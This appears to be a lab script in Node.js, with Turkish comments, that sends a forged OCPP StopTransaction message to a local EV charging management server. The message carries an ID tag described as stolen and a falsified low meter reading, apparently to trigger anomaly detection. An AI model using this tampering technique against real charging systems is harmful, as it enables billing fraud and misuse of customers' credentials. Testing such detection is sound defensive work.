// Aktif İstemci Kodu (Finansal Kurcalama - Terminal 2)

const WebSocket = require('ws');
// CSMS'in yeni portu: 9220
const CSMS_URL = 'ws://localhost:9220/EVSE-005'; 

const ws = new WebSocket(CSMS_URL);

ws.on('open', function open() {
    console.log('--- BAĞLANTI BAŞARILI ---');
    console.log('CSMS dinlemede ve bağlantı kuruldu.');

    // KURCALANMIŞ ANOMALİ MESAJI: StopTransaction (meterStop: 101)
    const tamperedMessage = JSON.stringify([
        2, 
        "400001", 
        "StopTransaction", 
        {
            "connectorId": 1,
            "idTag": "A1B2C3D4E5F6", // Log analizinde çalınan kimlik
            "meterStop": 101,          // Anormal düşük sayaç değeri (TAMPERING)
            "transactionId": 78        
        }
    ]);

    ws.send(tamperedMessage); 
    console.log('\n>>> AKTİF ANOMALİ (TAMPERING) TETİKLENDİ <<<');
    console.log(`Gönderilen Sahte Mesaj: ${tamperedMessage}`);
    
    setTimeout(() => { ws.close(); }, 1000); 
});

ws.on('error', (error) => { 
    console.error('Bağlantı Hatası Detayı:', error.code || error.message);
});